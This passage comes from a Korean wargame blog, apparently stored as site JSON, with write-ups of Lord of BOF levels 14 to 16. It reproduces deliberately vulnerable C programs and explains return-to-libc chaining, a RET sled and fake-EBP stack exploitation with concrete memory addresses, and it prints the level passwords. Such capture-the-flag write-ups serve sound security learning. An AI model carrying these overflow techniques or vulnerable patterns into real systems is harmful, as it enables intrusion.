class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 64.84848484848484%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAIAAAAmMtkJAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABdklEQVR42oVS7Y7jIAx0gLIhfNlAEghJttuk2n3/JzylOZ10p7Y3shA/GGbGNnzdbvNcl3WJMXr0MUVjjJRSa911HTxD0zQAYK2F69c19VFr3arWGOOck1Iyxh/FOOfvyERkrOk6ZYzpdGeN9d4757Q5lFul3pGnOuU8eu+JqNbqne8eEEI0jB3VNOz3+efCAMA5B2UqOWci0loTkfcOEUMgZy0dQGsNhUCBKFDqExKGEJyzy7pCnesw9Eopxvipjx4R8TDvfUwJ0csPKaXknAshpJRCCIAjL+z3fbvvKUYAmGq93/d5mWutn9drP/Th4ehl5m3fbtt2fANQpmnbbvMyTweKtbZtW631GfIlGREBYBzz98/3vMwhhMvlco7qNPmcvKzLvCyInjHWD0Mp5RiUc+rZkP4lr59rKSWlRIRjzojYqlYIca5H08Dj5Uvldcw5puS9DyFwzhv4D/5az6lOKSXnXN/3iEd7tdHGGK07pdSbhv0C3ywfwp8OMT8AAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/c3a744b4df002f3ff863caa3dcd23bad/c9b55/10.webp 165w,\n/static/c3a744b4df002f3ff863caa3dcd23bad/f2908/10.webp 330w,\n/static/c3a744b4df002f3ff863caa3dcd23bad/ff4b8/10.webp 602w\"\n              sizes=\"(max-width: 602px) 100vw, 602px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/c3a744b4df002f3ff863caa3dcd23bad/04c57/10.png 165w,\n/static/c3a744b4df002f3ff863caa3dcd23bad/d9ecf/10.png 330w,\n/static/c3a744b4df002f3ff863caa3dcd23bad/32056/10.png 602w\"\n            sizes=\"(max-width: 602px) 100vw, 602px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/c3a744b4df002f3ff863caa3dcd23bad/32056/10.png\"\n            alt=\"memory3\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>“/bin/sh”이라는 문자열이 막 끝나는 지점인 0xbffffef6이 NULL인 것을 볼 수 있다. 이제 execve함수의 두번째 인자({“/bin/sh”, NULL})의 NULL은 따로 주지 않아도 되며, “/bin/sh”을 담고 있는 주소지인 0xbffffeef를 가리키는 주소지를 따로 만들어서 이를 execve함수의 두번째 인자로 넘겨주면 된다는 결론을 내릴 수 있다.\r\n하지만 여기에는 한가지 문제가 있다. 이전의 문제에서 확인했듯 우리는 예측했던 주소지를 넣고 공격을 시도했을 시, 종종 예상했던 주소지가 맞지 않았던 경험을 하였다. 만약 “/bin/sh”의 문자열을 어딘가에 넣고, 그 주소지를 가리키는 또다른 환경변수 등을 지정했을 시, 예상했던 “/bin/sh”이 미묘하게 다른 곳에 있을 수도 있고, 여기에 맞추어 “/bin/sh”의 주소지를 가리키던 환경변수까지 바꾸어 주어야 할 것이다. 브루트 포스 코드를 짜서 공격하는 방법도 있겠지만, 조금 더 실패할 가능성이 적은 쉬운 아이디어를 떠올렸다.</p>\n<p>| NULL |\r\n| “/bin/sh” |\r\n| exit |\r\n| system |\r\n| execve |</p>\n<p>execve를 호출하자마자 exit함수를 인자로 넣어 종료시킨 후, 바로 system함수를 호출하여 이전의 darkknight문제를 풀었듯 system으로 하여금 “/bin/sh”을 실행시키게 하는 방법이다.\r\n이미 구한 execve함수의 주소(0x400a9d48), 이전 문제에서 찾은 system 함수의 주소(0x40058ae0), system 함수 내에 존재하는 “/bin/sh” 문자열의 주소(0x400fbff9), 메모리에 끝자락에 항상 NULL로 존재하는 주소지(0xbffffffc) 등을 알고 있다. exit함수의 주소를 찾았다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 366px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 38.78787878787879%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAIAAAB2/0i6AAAACXBIWXMAAA7DAAAOwwHHb6hkAAABIklEQVR42nWQ246DMAxEQ5uLEzuxEwikQCn0/z9yRbuVVpV2HizLM+fBo5Z12Y+ttbau8zhN7dbaNKYUJct6X+o49X1JiZdlds7mUqbbjRMhkjFabfs+L7NwKqXcty1n0frqwAEAIgJA13VKqe6jy+XyXpRSarnfH4+t1kGEjTFIFIIvpUjOpe+Z+ZX6R4/jWNdZRAAcIiIhRdLXawgBEUMIKRHF6L134M4jodbXXzicCR9jxOATJ8nCwlprIso5p0g5C7MgonMuscjpfuDI/LITERpjtNH8ukguIsl7D96ziA8BwHVfP+zP53HsfcnTOE7T+K4K/DkcgLXWGksxWmu11t/wUCsR5iytNRYZ3s1ZW8c61GGote+LAxhO9Vrrv/APwZoVysl63lYAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/fd3a914e873e15bf4a91cc6d0ebc48b8/c9b55/11.webp 165w,\n/static/fd3a914e873e15bf4a91cc6d0ebc48b8/f2908/11.webp 330w,\n/static/fd3a914e873e15bf4a91cc6d0ebc48b8/4146f/11.webp 366w\"\n              sizes=\"(max-width: 366px) 100vw, 366px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/fd3a914e873e15bf4a91cc6d0ebc48b8/04c57/11.png 165w,\n/static/fd3a914e873e15bf4a91cc6d0ebc48b8/d9ecf/11.png 330w,\n/static/fd3a914e873e15bf4a91cc6d0ebc48b8/8b153/11.png 366w\"\n            sizes=\"(max-width: 366px) 100vw, 366px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/fd3a914e873e15bf4a91cc6d0ebc48b8/8b153/11.png\"\n            alt=\"p_exit\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>exit 함수의 주소는 0x40039130이다. 이 정보들을 취합하여 공격을 시도하였다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 602px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 27.272727272727277%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAIAAADKYVtkAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAAnUlEQVR42pXOwQ6DIAwGYCQptIiIlhaXIYlX3/8BF/Ww6/afvuZvmpq979trE5Faayml1ppzjjGq6rIuorIseRxHLqwqIpJzTinNeT7P08QYEREAhmEwv+XZFBHDzNOUvPfgwDmHd64R4IZz7iouu9sARGStba2Z4zhWXpk5hOC9R8QQAgV6TEjPLaKvYxyttb1309pbVUspiPjv2x/33AsrJwuktgAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/4644b3af8bf66f8b4720b50bad03c885/c9b55/12.webp 165w,\n/static/4644b3af8bf66f8b4720b50bad03c885/f2908/12.webp 330w,\n/static/4644b3af8bf66f8b4720b50bad03c885/ff4b8/12.webp 602w\"\n              sizes=\"(max-width: 602px) 100vw, 602px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/4644b3af8bf66f8b4720b50bad03c885/04c57/12.png 165w,\n/static/4644b3af8bf66f8b4720b50bad03c885/d9ecf/12.png 330w,\n/static/4644b3af8bf66f8b4720b50bad03c885/32056/12.png 602w\"\n            sizes=\"(max-width: 602px) 100vw, 602px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/4644b3af8bf66f8b4720b50bad03c885/32056/12.png\"\n            alt=\"exploit\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>my-pass: one step closer</p>","categories":["writeup","wargame","pwnable"],"date":"February 05, 2016","description":"","id":"d2c2fd86-89a2-52e9-9a51-5c3a881c496c","keywords":["lob"],"slug":"/Lord-of-BOF-WriteUp-14/","title":"LOB 14번 (bugbear -> giant)","readingTime":{"text":"8 min read"}},{"banner":{"alt":null,"caption":null,"src":{"childImageSharp":{"gatsbyImageData":{"layout":"constrained","backgroundColor":"#080808","images":{"fallback":{"src":"/static/c3ce028046fb9eb6c9e9f053d597907c/9d034/0.png","srcSet":"/static/c3ce028046fb9eb6c9e9f053d597907c/b4e5d/0.png 104w,\n/static/c3ce028046fb9eb6c9e9f053d597907c/b1e80/0.png 208w,\n/static/c3ce028046fb9eb6c9e9f053d597907c/9d034/0.png 415w","sizes":"(min-width: 415px) 415px, 100vw"},"sources":[{"srcSet":"/static/c3ce028046fb9eb6c9e9f053d597907c/99b09/0.webp 104w,\n/static/c3ce028046fb9eb6c9e9f053d597907c/8c3d7/0.webp 208w,\n/static/c3ce028046fb9eb6c9e9f053d597907c/76f47/0.webp 415w","type":"image/webp","sizes":"(min-width: 415px) 415px, 100vw"}]},"width":660,"height":400.7710843373494}}}},"body":"<p>source code:</p>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\"><span class=\"token comment\">/*\r\n        The Lord of the BOF : The Fellowship of the BOF\r\n        - assassin\r\n        - no stack, no RTL\r\n*/</span>\r\n\r\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span>\r\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdlib.h></span></span>\r\n\r\n<span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> argc<span class=\"token punctuation\">,</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>argv<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\r\n<span class=\"token punctuation\">{</span>\r\n        <span class=\"token keyword\">char</span> buffer<span class=\"token punctuation\">[</span><span class=\"token number\">40</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\r\n\r\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>argc <span class=\"token operator\">&lt;</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\r\n                <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"argv error\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n                <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n        <span class=\"token punctuation\">}</span>\r\n\r\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">47</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token char\">'\\xbf'</span><span class=\"token punctuation\">)</span>\r\n        <span class=\"token punctuation\">{</span>\r\n                <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"stack retbayed you!\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n                <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n        <span class=\"token punctuation\">}</span>\r\n\r\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">47</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token char\">'\\x40'</span><span class=\"token punctuation\">)</span>\r\n        <span class=\"token punctuation\">{</span>\r\n                <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"library retbayed you, too!!\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n                <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n        <span class=\"token punctuation\">}</span>\r\n\r\n        <span class=\"token function\">strcpy</span><span class=\"token punctuation\">(</span>buffer<span class=\"token punctuation\">,</span> argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n        <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%s\\n\"</span><span class=\"token punctuation\">,</span> buffer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n\r\n        <span class=\"token comment\">// buffer+sfp hunter</span>\r\n        <span class=\"token function\">memset</span><span class=\"token punctuation\">(</span>buffer<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">44</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n<span class=\"token punctuation\">}</span></code></pre></div>\n<p>Stack frame structure:</p>\n<p>| buffer[40] |\r\n| SFP |\r\n| RET |\r\n| argc |\r\n| argv |\r\n| environ |</p>\n<p>19번째 줄에서 스택 사용을 방지하고 있고, 25번째 줄에서 argv[1][47]의 값을 검사함으로써 라이브러리 사용을 막고 있고, 32번째 줄에서 buffer와 sfp를 모두 0으로 지워버리고 있다. 이번엔 RET sled라는 공격기법을 적용해 보았다.\r\nRET sled는 간단하다. 함수가 끝날 때 호출되는 ret에 ret 주소를 입력하면, 그 다음에 오는 주소로 리턴되는 원리를 사용한 것이다. 이전까지는 ret 자리에 shell의 주소를 입력했다면, 이번에는 ret 자리에 ret 주소를 쓰고 바로 뒤이어서 shell 주소를 입력하는 것이다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 415px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 26.666666666666668%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAIAAADKYVtkAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAAwUlEQVR42nXOy46DMAyFYYdQAlOIE2I79/Ty/g9ZIXUxGmm+1b850oGUc6kl5WytTTkxM7FQCADgT89MSqnWOzPtx27WdT8ORLttGwBA6208RqkVnetjtFZZhJkAgCUFuqL2FqO83m/v3c/9btGuq7nGMaWck8RoEVNOIuKcP0+vABCRReZZa62nadJaq2mC3/oYz9ez9YHOtdFrLSTCdN1mZucQ/lJKqW/mUojCGQIxt96isEUspdxu82IWYxb43wceAA/MXSSl+QAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/c3ce028046fb9eb6c9e9f053d597907c/c9b55/0.webp 165w,\n/static/c3ce028046fb9eb6c9e9f053d597907c/f2908/0.webp 330w,\n/static/c3ce028046fb9eb6c9e9f053d597907c/1d89e/0.webp 415w\"\n              sizes=\"(max-width: 415px) 100vw, 415px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/c3ce028046fb9eb6c9e9f053d597907c/04c57/0.png 165w,\n/static/c3ce028046fb9eb6c9e9f053d597907c/d9ecf/0.png 330w,\n/static/c3ce028046fb9eb6c9e9f053d597907c/73926/0.png 415w\"\n            sizes=\"(max-width: 415px) 100vw, 415px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/c3ce028046fb9eb6c9e9f053d597907c/73926/0.png\"\n            alt=\"disas\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>ret의 주소를 확인하였다. 0x0804851e이다. 여기에 breakpoint를 걸고 아래와 같이 입력하여 확인하였다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 602px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 32.72727272727273%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAIAAACHqfpvAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABG0lEQVR42nWPy5aDIBBEEYKAgry6iZpRxEST///CGTzZzl10Vy3uosj8mADiPE/jOIYYet2zG6OU0oZSxiijjNXaNA2l30wp5ZwTQkgIXik1DEZKMVz0uldKClGrMdpaa8wghOj6znlvnXXOBe+r7L03w4AJrbXeO0CwgzXGRACtddu2WmvOb1JJJaVSSlw4d8n7XrayfT7v4zzO83y/z7KXUspxvLayzfMDEadpyjmv67osS87r4zHf73cpJUmIiBBCAISUEkC9KaUQQogV7/0VIcYIEBHA2uG7eZpGxNoxoTF1ueo6KQVjrGka8g+c3+p7vvY155Zz69yyLj/LT9tyznnO6/7crbOEkHmetrKlhISQCJC3OuJP/gWJ9xjo0xn+nAAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/f20def5e5e9d15bcbb9dc45970e6e4f5/c9b55/1.webp 165w,\n/static/f20def5e5e9d15bcbb9dc45970e6e4f5/f2908/1.webp 330w,\n/static/f20def5e5e9d15bcbb9dc45970e6e4f5/ff4b8/1.webp 602w\"\n              sizes=\"(max-width: 602px) 100vw, 602px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/f20def5e5e9d15bcbb9dc45970e6e4f5/04c57/1.png 165w,\n/static/f20def5e5e9d15bcbb9dc45970e6e4f5/d9ecf/1.png 330w,\n/static/f20def5e5e9d15bcbb9dc45970e6e4f5/32056/1.png 602w\"\n            sizes=\"(max-width: 602px) 100vw, 602px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/f20def5e5e9d15bcbb9dc45970e6e4f5/32056/1.png\"\n            alt=\"memory\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 602px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 36.36363636363637%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAIAAACHqfpvAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABB0lEQVR42i3Q266EIAxA0Q5mNDLJqNyFlhY8//+NJ+i88bK7WqD1fv31EDwAxBhb7yEGALDWMlfEDAD7votILnlSatWauRLRsixwx1cI4YmpkrEGAIw1iHie5xNTpRCjeoH+aKqUzvP9fkO7euvdezfiFKWJMSN23rFIzr+YRZCKUi+tPyKMhPM8Q7+6iDjnHrn33wnGGmmMWEZ8HCKCWJRSWmtpXPlem3mMeTTvfa1k77X340As55kA4LtthJhSVEqt60qEueQhS5MhWwsAIYTWxPshH8aMuWXI27axcCn5jnXlSvWWx2vIx7jTOWa2xj5yrZTz+O3vdytYYkrTNOSCJaW4LPM/o/YfKHb9Gy4AAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/6fc21e1ad4baf611885417c2829e1516/c9b55/2.webp 165w,\n/static/6fc21e1ad4baf611885417c2829e1516/f2908/2.webp 330w,\n/static/6fc21e1ad4baf611885417c2829e1516/ff4b8/2.webp 602w\"\n              sizes=\"(max-width: 602px) 100vw, 602px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/6fc21e1ad4baf611885417c2829e1516/04c57/2.png 165w,\n/static/6fc21e1ad4baf611885417c2829e1516/d9ecf/2.png 330w,\n/static/6fc21e1ad4baf611885417c2829e1516/32056/2.png 602w\"\n            sizes=\"(max-width: 602px) 100vw, 602px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/6fc21e1ad4baf611885417c2829e1516/32056/2.png\"\n            alt=\"memory2\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>우선 ‘if(argv[1][47] == '\\xbf')’ 조건을 성공적으로 우회한 것을 볼 수 있다. buffer 영역은 memset되어서 활용하지 못하고, argv 영역은 사용할 수 있다. argv에서 B(\\x42)를 입력한 부분은 0xbffffc20 즈음으로 생각하고 아래와 같은 페이로드를 입력하였다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 602px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 27.878787878787882%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAIAAABM9SnKAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAAtElEQVR42pWO247CMBBDA41AucyNoWkmBNqy//+Pq6A+I3FeLMuybFfr0ntf11e1uu97KfNN9f33XupSytxaK6U8n7219lrX3vs8381s2zYRcSxclmK1WjMza492EwHIgJhSAgQRRgBiIiIA8N6fTmfvvXPOxRhDiJfr4PKRI/jKNE1DqlViTinHzw4i5pxTSkSEiCyCAMOyIAKzIGGMUVVHf7xhDiG4XziW9a6qCoiH/6X8D4xPDngViwTwAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/efa532d0ff9fd9597be96b1f6941f2cf/c9b55/3.webp 165w,\n/static/efa532d0ff9fd9597be96b1f6941f2cf/f2908/3.webp 330w,\n/static/efa532d0ff9fd9597be96b1f6941f2cf/ff4b8/3.webp 602w\"\n              sizes=\"(max-width: 602px) 100vw, 602px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/efa532d0ff9fd9597be96b1f6941f2cf/04c57/3.png 165w,\n/static/efa532d0ff9fd9597be96b1f6941f2cf/d9ecf/3.png 330w,\n/static/efa532d0ff9fd9597be96b1f6941f2cf/32056/3.png 602w\"\n            sizes=\"(max-width: 602px) 100vw, 602px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/efa532d0ff9fd9597be96b1f6941f2cf/32056/3.png\"\n            alt=\"exploit\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>my-pass: pushing me away</p>","categories":["writeup","wargame","pwnable"],"date":"February 05, 2016","description":"","id":"9d9f6ac5-e118-57c6-822c-a7a3022cb71e","keywords":["lob"],"slug":"/Lord-of-BOF-WriteUp-15/","title":"LOB 15번 (giant -> assassin)","readingTime":{"text":"2 min read"}},{"banner":{"alt":null,"caption":null,"src":{"childImageSharp":{"gatsbyImageData":{"layout":"constrained","backgroundColor":"#080808","images":{"fallback":{"src":"/static/f966d2796c118cfb3696d47c24ce8320/a2661/0.png","srcSet":"/static/f966d2796c118cfb3696d47c24ce8320/27b82/0.png 103w,\n/static/f966d2796c118cfb3696d47c24ce8320/26f85/0.png 206w,\n/static/f966d2796c118cfb3696d47c24ce8320/a2661/0.png 411w","sizes":"(min-width: 411px) 411px, 100vw"},"sources":[{"srcSet":"/static/f966d2796c118cfb3696d47c24ce8320/643ae/0.webp 103w,\n/static/f966d2796c118cfb3696d47c24ce8320/1f347/0.webp 206w,\n/static/f966d2796c118cfb3696d47c24ce8320/f4a5e/0.webp 411w","type":"image/webp","sizes":"(min-width: 411px) 411px, 100vw"}]},"width":660,"height":399.8540145985401}}}},"body":"<p>source code:</p>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\"><span class=\"token comment\">/*\r\n        The Lord of the BOF : The Fellowship of the BOF\r\n        - zombie_assassin\r\n        - FEBP\r\n*/</span>\r\n\r\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span>\r\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdlib.h></span></span>\r\n\r\n<span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> argc<span class=\"token punctuation\">,</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>argv<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\r\n<span class=\"token punctuation\">{</span>\r\n        <span class=\"token keyword\">char</span> buffer<span class=\"token punctuation\">[</span><span class=\"token number\">40</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\r\n\r\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>argc <span class=\"token operator\">&lt;</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\r\n                <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"argv error\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n                <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n        <span class=\"token punctuation\">}</span>\r\n\r\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">47</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token char\">'\\xbf'</span><span class=\"token punctuation\">)</span>\r\n        <span class=\"token punctuation\">{</span>\r\n                <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"stack retbayed you!\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n                <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n        <span class=\"token punctuation\">}</span>\r\n\r\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">47</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token char\">'\\x40'</span><span class=\"token punctuation\">)</span>\r\n        <span class=\"token punctuation\">{</span>\r\n                <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"library retbayed you, too!!\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n                <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n        <span class=\"token punctuation\">}</span>\r\n\r\n        <span class=\"token comment\">// strncpy instead of strcpy!</span>\r\n        <span class=\"token function\">strncpy</span><span class=\"token punctuation\">(</span>buffer<span class=\"token punctuation\">,</span> argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">48</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n        <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%s\\n\"</span><span class=\"token punctuation\">,</span> buffer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n<span class=\"token punctuation\">}</span></code></pre></div>\n<p>Stack frame structure:</p>\n<p>| buffer[40] |\r\n| SFP |\r\n| RET |\r\n| argc |\r\n| argv |\r\n| environ |</p>\n<p>문제에서 FEBP, fake EBP라는 힌트를 주었다. fake EBP는 golem -> darkknight 문제에서 한번 언급된 바 있다.\r\nfake EBP는 ebp를 통해 eip를 조작하는 기법이다. 이를 알아보기 위해 실험을 해 보았다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 411px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 23.636363636363637%; position: relative; bottom: 0; left: 0; background-image: 